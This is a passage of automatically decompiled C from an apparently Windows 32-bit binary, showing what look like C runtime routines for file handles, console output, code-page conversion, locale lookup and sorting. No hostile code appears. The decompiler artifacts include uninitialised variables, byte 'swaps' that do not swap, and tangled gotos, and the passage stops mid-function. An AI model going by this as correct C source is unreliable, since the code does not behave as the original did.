                        // 0x40ea8a
                        v36 = v42 | 0x3000000;
                    } else {
                        // 0x40ea7e
                        v36 = v44 != 64 ? v42 : v42 | 0x1000000;
                    }
                }
                // break -> 0x40ea98
                break;
            }
            case 0x4000: {
                // 0x40ea60
                v41 = v39 | 512;
                // branch (via goto) -> 0x40ea6e
                goto lab_0x40ea6e;
            }
            default: {
                // 0x40ea54
                v41 = v40 != 0x6000 ? v39 : v39 | 768;
                // branch (via goto) -> 0x40ea6e
                goto lab_0x40ea6e;
            }
        }
    }
    int32_t v45 = v36 | result; // 0x40ea9a
    // 0x40eab1
    return ((v36 ^ result) & 0x8031f) == 0 ? v45 : v45 | -0x80000000;
}

// Address range: 0x40eab8 - 0x40eb51
int32_t function_40eab8(uint32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = 2 * a1 & 8 | a1 / 2 & 4 | 8 * a1 & 16 | 32 * a1 & 32 | a1 / 0x40000 & 2 | (int32_t)(bool)((a1 & 16) != 0);
    int32_t v2 = a1 & 768; // 0x40eb01
    int32_t v3 = v1; // 0x40eab8
    int32_t v4; // 0x40eab8
    switch (v2) {
        case 256: {
            // 0x40eb23
            v3 = v1 | 1024;
        }
        case 0: {
          lab_0x40eb28:;
            int32_t v5 = v3;
            int32_t v6 = a1 & 0x30000; // 0x40eb2a
            if (v6 == 0) {
                // 0x40eb3e
                v4 = v5 | 768;
            } else {
                // 0x40eb32
                v4 = v6 != 0x10000 ? v5 : v5 | 512;
            }
            // break -> 0x40eb40
            break;
        }
        case 512: {
            // 0x40eb1c
            v3 = v1 | 2048;
            // branch (via goto) -> 0x40eb28
            goto lab_0x40eb28;
        }
        default: {
            // 0x40eb11
            v3 = v2 != 768 ? v1 : v1 | 3072;
            // branch (via goto) -> 0x40eb28
            goto lab_0x40eb28;
        }
    }
    // 0x40eb40
    return v4 | a1 / 64 & 0x1000;
}

// Address range: 0x40eb51 - 0x40eba7
int32_t function_40eb51(uint32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    if (a1 == -2) {
        // 0x40eb5e
        *(int32_t *)function_40b091() = 9;
        // 0x40eba3
        return 0;
    }
    if (a1 >= 0) {
        // 0x40eb6f
        if ((uint32_t)g209 > a1) {
            int32_t v1 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40eb82
            return (int32_t)(*(char *)(48 * (a1 & 63) + 40 + v1) & 64);
        }
    }
    // 0x40eb93
    *(int32_t *)function_40b091() = 9;
    // 0x40eba3
    return 0;
}

// Address range: 0x40eba7 - 0x40ec25
int32_t function_40eba7(int32_t a1, int32_t a2, int32_t lpNewFilePointer, int32_t a4, int32_t a5) {
    struct _LARGE_INTEGER liDistanceToMove; // 0x40ebe0
    int32_t hFile = function_40df4c(a1); // 0x40ebb4
    if (hFile == -1) {
        // 0x40ebc1
        *(int32_t *)function_40b091() = 9;
        // 0x40ec1f
        return -1;
    }
    // 0x40ebd2
    liDistanceToMove = (struct {int64_t e0;}){
        .e0 = 0
    };
    liDistanceToMove.e0 = a2;
    int32_t dwMoveMethod; // bp-12, 0x40eba7
    bool v1 = SetFilePointerEx((int32_t *)hFile, liDistanceToMove, (struct _LARGE_INTEGER *)lpNewFilePointer, (int32_t)&dwMoveMethod); // 0x40ebe0
    if (!v1) {
        // 0x40ebea
        GetLastError();
        function_40b05b();
        // 0x40ec1f
        return -1;
    }
    int32_t result = -1; // 0x40ec03
    int32_t v2; // 0x40eba7
    if ((result & v2) != -1) {
        int32_t v3 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40ec13
        char * v4 = (char *)(48 * (a1 & 63) + 40 + v3); // 0x40ec1a
        *v4 = *v4 & -3;
    }
    // 0x40ec1f
    return result;
}

// Address range: 0x40ec25 - 0x40ec40
int32_t function_40ec25(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x40ec25
    int32_t v1; // 0x40ec25
    return function_40eba7(a1, a2, a3, a4, v1);
}

// Address range: 0x40ec40 - 0x40ec85
int32_t function_40ec40(int32_t a1) {
    int32_t lpBuffer = a1;
    int32_t hConsoleOutput = g141; // 0x40ec4e
    if (g141 == -2) {
        // 0x40ec50
        int32_t v1; // 0x40ec40
        int32_t v2; // 0x40ec40
        function_40fa11(v2, v1);
        hConsoleOutput = g141;
    }
    // 0x40ec5a
    if (hConsoleOutput == -1) {
        // 0x40ec81
        return 0xffff;
    }
    // 0x40ec66
    int32_t lpNumberOfCharsWritten; // bp-8, 0x40ec40
    bool v3 = WriteConsoleW((int32_t *)hConsoleOutput, &lpBuffer, 1, &lpNumberOfCharsWritten, NULL); // 0x40ec73
    int32_t result = 0xffff; // 0x40ec7b
    if (v3) {
        // 0x40ec7d
        result = lpBuffer | -0x10000;
    }
    // 0x40ec81
    return result;
}

// Address range: 0x40ec85 - 0x40ed1c
int32_t function_40ec85(void) {
    int32_t v1 = &g106; // bp-8, 0x40ec87
    function_406cf0(&g106, 16, (int32_t)&g266);
    int32_t v2; // 0x40ec85
    int32_t * v3 = (int32_t *)(v2 - 28); // 0x40ec91
    *v3 = 0;
    function_40c527(8);
    int32_t * v4 = (int32_t *)(v2 - 4); // 0x40ec9d
    *v4 = 0;
    int32_t * v5 = (int32_t *)(v2 - 32); // 0x40eca4
    *v5 = 3;
    int32_t result; // 0x40ed16
    if (g202 == 3) {
        // 0x40ed07
        *v4 = -2;
        function_40ed1c();
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v6 = 3; // 0x40ed04
    int32_t v7 = &v1;
    int32_t v8 = 4 * v6; // 0x40ecb4
    int32_t v9 = *(int32_t *)(g203 + v8); // 0x40ecb4
    int32_t v10 = v7; // 0x40ecb9
    int32_t * v11; // 0x40ec85
    if (v9 != 0) {
        // 0x40ecbb
        v10 = v7 - 4;
        v11 = (int32_t *)v10;
        if ((*(int32_t *)(v9 + 12) & 0x2000) != 0) {
            // 0x40ecc5
            *v11 = v9;
            if (function_40fabd() != -1) {
                // 0x40ecd8
                *v3 = *v3 + 1;
            }
        }
        // 0x40ecdb
        *v11 = *(int32_t *)(g203 + v8) + 32;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
        *(int32_t *)(v7 - 8) = *(int32_t *)(g203 + v8);
        function_40c15c((int32_t)&g266);
        *(int32_t *)(g203 + v8) = 0;
    }
    // 0x40ed04
    v6++;
    *v5 = v6;
    while (v6 != g202) {
        // 0x40ecaf
        v7 = v10;
        v8 = 4 * v6;
        v9 = *(int32_t *)(g203 + v8);
        v10 = v7;
        if (v9 != 0) {
            // 0x40ecbb
            v10 = v7 - 4;
            v11 = (int32_t *)v10;
            if ((*(int32_t *)(v9 + 12) & 0x2000) != 0) {
                // 0x40ecc5
                *v11 = v9;
                if (function_40fabd() != -1) {
                    // 0x40ecd8
                    *v3 = *v3 + 1;
                }
            }
            // 0x40ecdb
            *v11 = *(int32_t *)(g203 + v8) + 32;
            DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
            *(int32_t *)(v7 - 8) = *(int32_t *)(g203 + v8);
            function_40c15c((int32_t)&g266);
            *(int32_t *)(g203 + v8) = 0;
        }
        // 0x40ed04
        v6++;
        *v5 = v6;
    }
    // 0x40ed07
    *v4 = -2;
    function_40ed1c();
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40ed1c - 0x40ed25
int32_t function_40ed1c(void) {
    // 0x40ed1c
    return function_40c56f(8);
}

// Address range: 0x40ed25 - 0x40ed63
int32_t function_40ed25(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x40ed32
    uint32_t v2 = *v1; // 0x40ed32
    if ((v2 & 0x2000) == 0) {
        // 0x40ed5f
        return v2 / 0x2000;
    }
    int32_t result = v2 / 64; // 0x40ed42
    if ((v2 & 64) != 0) {
        int32_t * v3 = (int32_t *)(a1 + 4); // 0x40ed44
        function_40c15c(*v3);
        *v1 = *v1 & -321;
        *v3 = 0;
        *(int32_t *)a1 = 0;
        *(int32_t *)(a1 + 8) = 0;
        result = 0;
    }
    // 0x40ed5f
    return result;
}

// Address range: 0x40ed63 - 0x40edec
int32_t function_40ed63(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40ed63
    function_406cf0(&g107, 12, (int32_t)&g266);
    int32_t v1; // 0x40ed63
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40ed71
    *v2 = 0;
    function_40de75(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40ed7f
    *v3 = 0;
    int32_t v4 = *(int32_t *)*(int32_t *)*(int32_t *)(v1 + 12); // 0x40ed87
    int32_t v5 = *(int32_t *)(4 * v4 / 64 + (int32_t)&g207); // 0x40ed96
    int32_t v6; // 0x40ed63
    if ((*(char *)(v5 + 40 + 48 * (v4 & 63)) & 1) == 0) {
        goto lab_0x40edc5;
    } else {
        int32_t hFile = function_40df4c(v4); // 0x40eda5
        v6 = 0;
        if (FlushFileBuffers((int32_t *)hFile)) {
            goto lab_0x40edd3;
        } else {
            // 0x40edb6
            *(int32_t *)function_40b07e() = GetLastError();
            goto lab_0x40edc5;
        }
    }
  lab_0x40edc5:
    // 0x40edc5
    *(int32_t *)function_40b091() = 9;
    v6 = -1;
    goto lab_0x40edd3;
  lab_0x40edd3:
    // 0x40edd3
    *v2 = v6;
    *v3 = -2;
    function_40edef();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40ede4
    return result;
}

// Address range: 0x40edef - 0x40edfb
int32_t function_40edef(void) {
    // 0x40edef
    int32_t v1; // 0x40edef
    return function_40de98(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40edfb - 0x40ee23
int32_t function_40edfb(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5) {
    int32_t v1 = a1; // bp-12, 0x40ee09
    int32_t v2 = a1; // bp-16, 0x40ee0c
    int32_t v3; // 0x40edfb
    return function_40ed63(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40ee23 - 0x40ee92
int32_t function_40ee23(uint32_t a1) {
    int32_t v1 = a1;
    if (a1 == -2) {
        // 0x40ee32
        *(int32_t *)function_40b091() = 9;
        // 0x40ee8d
        return -1;
    }
    if (a1 < 0 || g209 <= a1) {
        // 0x40ee7a
        *(int32_t *)function_40b091() = 9;
        // 0x40ee8d
        return -1;
    }
    int32_t v2 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40ee58
    if ((*(char *)(48 * (a1 & 63) + 40 + v2) & 1) == 0) {
        // 0x40ee7a
        *(int32_t *)function_40b091() = 9;
        // 0x40ee8d
        return -1;
    }
    int32_t v3 = &v1; // bp-8, 0x40ee69
    // 0x40ee8d
    int32_t v4; // 0x40ee23
    int32_t v5; // 0x40ee23
    return function_40edfb(a1, &v3, v4, &v1, v5);
}

// Address range: 0x40ee92 - 0x40eecb
int32_t function_40ee92(int32_t a1, int32_t * a2) {
    // 0x40ee92
    function_409954((int32_t)a2, (int32_t)&g266);
    char v1; // 0x40ee92
    if (v1 != 0) {
        // 0x40eebd
        int32_t v2; // 0x40ee92
        int32_t * v3 = (int32_t *)(v2 + 848); // 0x40eec0
        *v3 = *v3 & -3;
    }
    // 0x40eec7
    int32_t v4; // 0x40ee92
    return (int32_t)(*(int16_t *)(*(int32_t *)v4 + (2 * a1 & 510)) & -0x8000);
}

// Address range: 0x40eecb - 0x40f0e8
int32_t function_40eecb(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    int32_t cbMultiByte = a5; // 0x40eee4
    if (a5 >= 1) {
        // 0x40eee6
        int32_t v1; // bp-4, 0x40eecb
        int32_t v2; // 0x40eecb
        int32_t v3; // 0x40eecb
        int32_t v4; // 0x40eecb
        int32_t v5; // 0x40eecb
        int32_t v6; // 0x40eecb
        int32_t v7 = function_40fb3d(a4, a5, v2, v3, v5, v6, g112 ^ (int32_t)&v1, v4); // 0x40eeea
        cbMultiByte = v7 + (int32_t)(v7 < a5);
    }
    int32_t CodePage = a8; // 0x40eeff
    if (a8 == 0) {
        // 0x40ef01
        CodePage = *(int32_t *)(*a1 + 8);
    }
    int32_t v8 = CodePage; // bp-48, 0x40ef24
    char * lpMultiByteStr = (char *)a4; // 0x40ef25
    int32_t cchWideChar = MultiByteToWideChar(CodePage, 8 * (int32_t)(a9 != 0) | 1, lpMultiByteStr, cbMultiByte, NULL, 0); // 0x40ef25
    if (cchWideChar == 0) {
        // 0x40f0c3
        return function_406b2c();
    }
    int32_t v9 = &v8; // 0x40ef24
    uint32_t v10 = 2 * cchWideChar; // 0x40ef36
    int32_t v11 = 0; // 0x40ef42
    int32_t v12 = v9; // 0x40ef42
    int32_t v13; // 0x40eecb
    if (v10 > 0xfffffff7) {
        goto lab_0x40f0ba;
    } else {
        uint32_t v14 = v10 + 8; // 0x40ef44
        if (v14 < 1025) {
            // 0x40ef57
            function_411b10();
            v8 = 0xcccc;
            v13 = v9;
            goto lab_0x40ef98;
        } else {
            int32_t v15 = function_40c196(v14); // 0x40ef7b
            v11 = 0;
            v12 = v9;
            if (v15 == 0) {
                goto lab_0x40f0ba;
            } else {
                // 0x40ef8b
                *(int32_t *)v15 = 0xdddd;
                v13 = v15;
                goto lab_0x40ef98;
            }
        }
    }
  lab_0x40f0ba:
    // 0x40f0ba
    *(int32_t *)(v12 - 4) = v11;
    function_40e35a((int32_t)&g266);
    // 0x40f0c3
    return function_406b2c();
  lab_0x40ef98:;
    int32_t lpWideCharStr = v13 + 8; // 0x40ef91
    v11 = 0;
    v12 = v9;
    int32_t v16; // 0x40eecb
    int32_t v17; // 0x40eecb
    int32_t v18; // 0x40eecb
    int32_t v19; // bp-144, 0x40eecb
    int32_t v20; // 0x40efc8
    int32_t cchWideChar2; // 0x40efcb
    if (lpWideCharStr == 0) {
        goto lab_0x40f0ba;
    } else {
        int32_t v21 = CodePage; // bp-72, 0x40efaa
        int32_t v22 = MultiByteToWideChar(CodePage, 1, lpMultiByteStr, cbMultiByte, (int16_t *)lpWideCharStr, cchWideChar); // 0x40efab
        v11 = lpWideCharStr;
        v12 = &v21;
        if (v22 == 0) {
            goto lab_0x40f0ba;
        } else {
            int32_t v23 = a2; // bp-108, 0x40efc8
            v20 = &v23;
            cchWideChar2 = function_40c85a(a2, a3, lpWideCharStr, cchWideChar, 0, 0, 0, 0, 0);
            v11 = lpWideCharStr;
            v12 = v20;
            if (cchWideChar2 == 0) {
                goto lab_0x40f0ba;
            } else {
                if ((a3 & 1024) == 0) {
                    uint32_t v24 = 2 * cchWideChar2; // 0x40f01b
                    v18 = v20;
                    v17 = 0;
                    if (v24 > 0xfffffff7) {
                        goto lab_0x40f0b1;
                    } else {
                        uint32_t v25 = v24 + 8; // 0x40f029
                        if (v25 < 1025) {
                            // 0x40f03c
                            function_411b10();
                            v23 = 0xcccc;
                            v16 = v20;
                            goto lab_0x40f075;
                        } else {
                            int32_t v26 = function_40c196(v25); // 0x40f05c
                            v18 = v20;
                            v17 = 0;
                            if (v26 == 0) {
                                goto lab_0x40f0b1;
                            } else {
                                // 0x40f068
                                *(int32_t *)v26 = 0xdddd;
                                v16 = v26;
                                goto lab_0x40f075;
                            }
                        }
                    }
                } else {
                    // 0x40efe3
                    v11 = lpWideCharStr;
                    v12 = v20;
                    if (a7 != 0 && cchWideChar2 <= a7) {
                        // 0x40eff6
                        v19 = a2;
                        function_40c85a(a2, a3, lpWideCharStr, cchWideChar, a6, a7, 0, 0, 0);
                        v11 = lpWideCharStr;
                        v12 = &v19;
                    }
                    goto lab_0x40f0ba;
                }
            }
        }
    }
  lab_0x40f0b1:
    // 0x40f0b1
    *(int32_t *)(v18 - 4) = v17;
    function_40e35a((int32_t)&g266);
    v11 = lpWideCharStr;
    v12 = v18;
    goto lab_0x40f0ba;
  lab_0x40f075:;
    int32_t lpWideCharStr2 = v16 + 8; // 0x40f06e
    v18 = v20;
    v17 = 0;
    if (lpWideCharStr2 == 0) {
        goto lab_0x40f0b1;
    } else {
        // 0x40f079
        v19 = a2;
        int32_t v27 = function_40c85a(a2, a3, lpWideCharStr, cchWideChar, lpWideCharStr2, cchWideChar2, 0, 0, 0); // 0x40f08b
        v18 = &v19;
        v17 = lpWideCharStr2;
        if (v27 == 0) {
            goto lab_0x40f0b1;
        } else {
            int32_t cbMultiByte2 = a7 != 0 ? a7 : 0;
            char * lpMultiByteStr2 = a7 != 0 ? (char *)a6 : NULL;
            int32_t v28 = CodePage; // bp-176, 0x40f0a2
            int32_t v29 = &v28; // 0x40f0a2
            int32_t v30 = WideCharToMultiByte(CodePage, 0, (int16_t *)lpWideCharStr2, cchWideChar2, lpMultiByteStr2, cbMultiByte2, NULL, NULL); // 0x40f0a5
            v18 = v29;
            v17 = lpWideCharStr2;
            if (v30 != 0) {
                // 0x40f0df
                function_40e35a(lpWideCharStr2);
                v11 = lpWideCharStr;
                v12 = v29;
                goto lab_0x40f0ba;
            } else {
                goto lab_0x40f0b1;
            }
        }
    }
}

// Address range: 0x40f0e8 - 0x40f133
int32_t function_40f0e8(int32_t a1, int32_t a2, int32_t a3, char * a4, int32_t a5, int32_t * a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x40f0e8
    function_409954(a1, (int32_t)&g266);
    int32_t v1; // bp-16, 0x40f0e8
    int32_t result = function_40eecb(&v1, a2, a3, (int32_t)a4, a5, (int32_t)a6, a7, a8, a9); // 0x40f117
    char v2; // 0x40f0e8
    if (v2 != 0) {
        // 0x40f125
        int32_t v3; // 0x40f0e8
        int32_t * v4 = (int32_t *)(v3 + 848); // 0x40f128
        *v4 = *v4 & -3;
    }
    // 0x40f12f
    return result;
}

// Address range: 0x40f133 - 0x40f1ef
int32_t function_40f133(int32_t a1, int32_t a2) {
    // 0x40f133
    int32_t v1; // bp-32, 0x40f133
    int32_t * v2 = (int32_t *)((int32_t)&v1 - 4); // 0x40f15c
    int32_t v3 = 0; // 0x40f148
    int32_t v4 = 227; // 0x40f148
    int32_t v5 = v4 + v3; // 0x40f14b
    int32_t v6 = (v5 - (v5 >> 31)) / 2; // 0x40f15a
    *v2 = 65;
    int32_t v7 = 8 * v6; // 0x40f162
    int32_t v8 = *(int32_t *)(v7 + (int32_t)&g48); // 0x40f162
    *v2 = 90;
    int32_t v9 = 85; // 0x40f170
    int32_t v10 = v8; // 0x40f170
    int16_t v11 = *(int16_t *)(a1 - v8 + v10); // 0x40f171
    uint16_t v12 = v11 > 90 ? v11 : v11 + 32;
    int16_t v13 = *(int16_t *)v10; // 0x40f189
    uint16_t v14 = v13 > 90 ? v13 : v13 + 32;
    v9--;
    v10 += 2;
    while (v9 != 0 == (v12 != 0) == v12 == v14) {
        // 0x40f171
        v11 = *(int16_t *)(a1 - v8 + v10);
        v12 = v11 > 90 ? v11 : v11 + 32;
        v13 = *(int16_t *)v10;
        v14 = v13 > 90 ? v13 : v13 + 32;
        v9--;
        v10 += 2;
    }
    int32_t v15 = (int32_t)v12 - (int32_t)v14; // 0x40f1be
    while (v15 != 0) {
        // 0x40f1c2
        v3 = v15 >= 0 ? v6 + 1 : v3;
        v4 = v15 >= 0 ? v4 : v6 - 1;
        if (v3 > v4) {
            // 0x40f1e8
            return -1;
        }
        v5 = v4 + v3;
        v6 = (v5 - (v5 >> 31)) / 2;
        *v2 = 65;
        v7 = 8 * v6;
        v8 = *(int32_t *)(v7 + (int32_t)&g48);
        *v2 = 90;
        v9 = 85;
        v10 = v8;
        v11 = *(int16_t *)(a1 - v8 + v10);
        v12 = v11 > 90 ? v11 : v11 + 32;
        v13 = *(int16_t *)v10;
        v14 = v13 > 90 ? v13 : v13 + 32;
        v9--;
        v10 += 2;
        while (v9 != 0 == (v12 != 0) == v12 == v14) {
            // 0x40f171
            v11 = *(int16_t *)(a1 - v8 + v10);
            v12 = v11 > 90 ? v11 : v11 + 32;
            v13 = *(int16_t *)v10;
            v14 = v13 > 90 ? v13 : v13 + 32;
            v9--;
            v10 += 2;
        }
        // 0x40f1af
        v15 = (int32_t)v12 - (int32_t)v14;
    }
    // 0x40f1e8
    return *(int32_t *)(v7 + (int32_t)&g49);
}

// Address range: 0x40f1ef - 0x40f21b
int32_t function_40f1ef(int32_t a1) {
    // 0x40f1ef
    if (a1 == 0) {
        // 0x40f217
        return 0;
    }
    // 0x40f1fa
    int32_t v1; // 0x40f1ef
    int32_t v2 = function_40f133(a1, v1); // 0x40f1fd
    if (v2 < 0 || v2 >= 228) {
        // 0x40f217
        return 0;
    }
    // 0x40f20e
    return *(int32_t *)(8 * v2 + (int32_t)&g46);
}

// Address range: 0x40f220 - 0x40f2b6
int32_t function_40f220(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4) {
    if (a2 <= a1) {
        // 0x40f2a7
        return function_406b2c();
    }
    // 0x40f23b
    int32_t v1; // bp-20, 0x40f220
    int32_t v2 = &v1; // 0x40f23f
    int32_t v3 = a3 + a1;
    int32_t v4 = a1; // 0x40f249
    int32_t v5; // 0x40f220
    int32_t v6; // 0x40f220
    int32_t v7; // 0x40f220
    int32_t v8; // 0x40f26a
    if (v3 <= a2) {
        *(int32_t *)(v2 - 4) = a1;
        *(int32_t *)(v2 - 8) = v3;
        v7 = function_406b3d() < 1 ? a1 : v3;
        v8 = v3 + a3;
        v6 = v8;
        v5 = v7;
        v4 = v7;
        while (v8 <= a2) {
            // 0x40f250
            *(int32_t *)(v2 - 4) = v5;
            *(int32_t *)(v2 - 8) = v6;
            v7 = function_406b3d() < 1 ? v5 : v6;
            v8 = v6 + a3;
            v6 = v8;
            v5 = v7;
            v4 = v7;
        }
    }
    int32_t v9 = v4;
    int32_t v10; // 0x40f220
    char * v11; // 0x40f286
    int32_t v12; // 0x40f291
    char * v13; // 0x40f281
    if (a3 != 0 && v9 != a2) {
        // 0x40f27f
        v10 = a2;
        v12 = a3;
        v13 = (char *)v10;
        v11 = (char *)(v9 - a2 + v10);
        *v11 = *v13;
        *v13 = *v11;
        v12--;
        v10++;
        while (v12 != 0) {
            // 0x40f281
            v13 = (char *)v10;
            v11 = (char *)(v9 - a2 + v10);
            *v11 = *v13;
            *v13 = *v11;
            v12--;
            v10++;
        }
    }
    int32_t v14 = a2 - a3; // 0x40f29c
    while (v14 > a1) {
        uint32_t v15 = v14;
        v4 = a1;
        if (v3 <= v15) {
            *(int32_t *)(v2 - 4) = a1;
            *(int32_t *)(v2 - 8) = v3;
            v7 = function_406b3d() < 1 ? a1 : v3;
            v8 = v3 + a3;
            v6 = v8;
            v5 = v7;
            v4 = v7;
            while (v8 <= v15) {
                // 0x40f250
                *(int32_t *)(v2 - 4) = v5;
                *(int32_t *)(v2 - 8) = v6;
                v7 = function_406b3d() < 1 ? v5 : v6;
                v8 = v6 + a3;
                v6 = v8;
                v5 = v7;
                v4 = v7;
            }
        }
        // 0x40f273
        v9 = v4;
        if (a3 != 0 && v9 != v15) {
            // 0x40f27f
            v10 = v15;
            v12 = a3;
            v13 = (char *)v10;
            v11 = (char *)(v9 - v15 + v10);
            *v11 = *v13;
            *v13 = *v11;
            v12--;
            v10++;
            while (v12 != 0) {
                // 0x40f281
                v13 = (char *)v10;
                v11 = (char *)(v9 - v15 + v10);
                *v11 = *v13;
                *v13 = *v11;
                v12--;
                v10++;
            }
        }
        // 0x40f29c
        v14 = v15 - a3;
    }
    // 0x40f2a7
    return function_406b2c();
}

// Address range: 0x40f2c0 - 0x40f2f9
int32_t function_40f2c0(int32_t a1, int32_t result, int32_t a3) {
    // 0x40f2c0
    if (a1 == result || a3 == 0) {
        // 0x40f2f6
        return result;
    }
    int32_t v1 = a3; // 0x40f2da
    char * v2 = (char *)result; // 0x40f2e0
    int32_t result2 = result + 1; // 0x40f2e2
    char * v3 = (char *)(a1 - result + result); // 0x40f2e5
    *v3 = *v2;
    *v2 = *v3;
    v1--;
    while (v1 != 0) {
        int32_t v4 = result2;
        v2 = (char *)v4;
        result2 = v4 + 1;
        v3 = (char *)(a1 - result + v4);
        *v3 = *v2;
        *v2 = *v3;
        v1--;
    }
    // 0x40f2f6
    return result2;
}

// Address range: 0x40f300 - 0x40f69a
int32_t function_40f300(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4) {
    if (a1 == 0 == (a2 != 0) || a3 == 0 || a4 == 0) {
        // 0x40f33d
        *(int32_t *)function_40b091() = 22;
        return function_406b2c();
    }
    if (a2 < 2) {
        // 0x40f68a
        return function_406b2c();
    }
    // 0x40f378
    int32_t v1; // bp-4, 0x40f300
    int32_t v2 = &v1; // 0x40f303
    int32_t v3; // bp-300, 0x40f300
    int32_t v4 = &v3; // 0x40f37c
    int32_t * v5 = (int32_t *)(v4 - 4);
    int32_t * v6 = (int32_t *)(v4 - 8);
    int32_t * v7 = (int32_t *)(v4 - 12);
    int32_t v8 = v2 - 244;
    int32_t v9 = v2 - 124;
    int32_t v10 = a1; // 0x40f37d
    int32_t v11 = 0; // 0x40f37d
    int32_t v12 = (a2 - 1) * a3 + a1; // 0x40f37d
    int32_t v13; // 0x40f300
    uint32_t v14; // 0x40f300
    int32_t v15; // 0x40f300
    uint32_t v16; // 0x40f300
    uint32_t v17; // 0x40f300
    int32_t v18; // 0x40f300
    int32_t v19; // 0x40f300
    uint32_t v20; // 0x40f300
    int32_t v21; // 0x40f300
    int32_t v22; // 0x40f300
    int32_t v23; // 0x40f300
    uint32_t v24; // 0x40f300
    int32_t v25; // 0x40f300
    int32_t v26; // 0x40f300
    int32_t v27; // 0x40f300
    int32_t v28; // 0x40f300
    while (true) {
      lab_0x40f37f_2:
        // 0x40f37f
        v17 = v12;
        int32_t v29 = v10; // 0x40f37f
        int32_t v30 = v11; // 0x40f37f
        int32_t v31; // 0x40f300
        while (true) {
            // 0x40f385
            v31 = v30;
            v20 = v29;
            uint32_t v32 = (v17 - v20) / a3 + 1; // 0x40f38d
            if (v32 < 9) {
                // break -> 0x40f395
                break;
            }
            int32_t v33 = v32 / 2 * a3 + v20; // 0x40f3b0
            *v5 = v33;
            *v6 = v20;
            if (function_406b3d() >= 1) {
                // 0x40f3cb
                *v5 = a3;
                *v6 = v33;
                *v7 = v20;
                function_40f2c0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            }
            // 0x40f3db
            *v5 = v17;
            *v6 = v20;
            if (function_406b3d() >= 1) {
                // 0x40f3f8
                *v5 = a3;
                *v6 = v17;
                *v7 = v20;
                function_40f2c0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            }
            // 0x40f40d
            *v5 = v17;
            *v6 = v33;
            if (function_406b3d() >= 1) {
                // 0x40f425
                *v5 = a3;
                *v6 = v17;
                *v7 = v33;
                function_40f2c0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            }
            // 0x40f435
            v25 = v33;
            v27 = v17;
            v13 = v33;
            v18 = v20;
            while (true) {
              lab_0x40f450:;
                int32_t v34 = v18;
                v14 = v13;
                v28 = v27;
                v26 = v25;
                v19 = v34;
                if (v14 > v34) {
                    int32_t v35 = v34 + a3; // 0x40f454
                    int32_t v36 = v35; // 0x40f45e
                    v19 = v35;
                    if (v35 >= v14) {
                        goto lab_0x40f48b;
                    } else {
                        int32_t v37 = v36;
                        *v5 = v14;
                        *v6 = v37;
                        v23 = v37;
                        while (function_406b3d() < 1) {
                            int32_t v38 = v37 + a3; // 0x40f454
                            v36 = v38;
                            v19 = v38;
                            if (v38 >= v14) {
                                goto lab_0x40f48b;
                            }
                            v37 = v36;
                            *v5 = v14;
                            *v6 = v37;
                            v23 = v37;
                        }
                        goto lab_0x40f4c2;
                    }
                } else {
                    goto lab_0x40f48b;
                }
            }
          lab_0x40f563:;
            int32_t v39 = v15; // 0x40f567
            if (v14 < v15) {
                int32_t v40 = v39 - a3; // 0x40f570
                while (v40 > v14) {
                    // 0x40f576
                    *v5 = v14;
                    *v6 = v40;
                    if (function_406b3d() != 0) {
                        goto lab_0x40f5ca;
                    }
                    v40 -= a3;
                }
            }
            int32_t v41 = v15; // 0x40f59b
            v41 -= a3;
            int32_t v42 = v41; // 0x40f5a9
            while (v41 > v20) {
                // 0x40f5ab
                *v5 = v14;
                *v6 = v41;
                v42 = v41;
                if (function_406b3d() != 0) {
                    // break -> 0x40f5ca
                    break;
                }
                v41 -= a3;
                v42 = v41;
            }
          lab_0x40f5ca:
            // 0x40f5ca
            v16 = v42;
            if (v16 - v20 < v17 - v24) {
                // 0x40f61b
                v21 = v31;
                if (v17 <= v24) {
                    goto lab_0x40f637;
                } else {
                    int32_t v43 = 4 * v31; // 0x40f625
                    *(int32_t *)(v43 + v8) = v24;
                    *(int32_t *)(v43 + v9) = v17;
                    v21 = v31 + 1;
                    goto lab_0x40f637;
                }
            }
            int32_t v44 = v31; // 0x40f5e4
            if (v16 > v20) {
                int32_t v45 = 4 * v31; // 0x40f5ec
                *(int32_t *)(v45 + v8) = v20;
                *(int32_t *)(v45 + v9) = v16;
                v44 = v31 + 1;
            }
            // 0x40f5fe
            v30 = v44;
            v29 = v24;
            v22 = v30;
            if (v17 <= v24) {
                goto lab_0x40f662;
            }
        }
        // 0x40f395
        *v5 = a4;
        *v6 = a3;
        *v7 = v17;
        *(int32_t *)(v4 - 16) = v20;
        function_40f220((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v22 = v31;
        goto lab_0x40f662;
    }
  lab_0x40f68a:
